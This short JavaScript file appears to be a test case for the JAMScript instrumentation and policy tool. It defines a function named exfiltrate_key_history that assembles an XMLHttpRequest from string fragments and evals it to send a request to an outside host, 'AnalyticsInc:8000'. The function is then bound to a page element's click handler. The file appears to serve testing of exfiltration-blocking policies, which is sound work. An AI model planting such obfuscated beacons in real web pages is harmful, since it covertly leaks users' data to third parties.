
JAM.startProfile('load');
function exfiltrate_key_history(){var a="xmlhttp=new XMLHt",b="tpRequest();",c="xmlhttp.op",d='en("GET", "http://AnalyticsInc:8000/submission.html?test=concat", true);',e="xmlhttp.se",f="nd(null);",a=a+b,c=a+c,d=c+d,e=d+e,f=e+f;JAMScript.isEval(eval)?eval("introspect(JAMScript.introspectors.processAll) { "+f+" }"):JAMScript.call(eval,null,[f])}var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
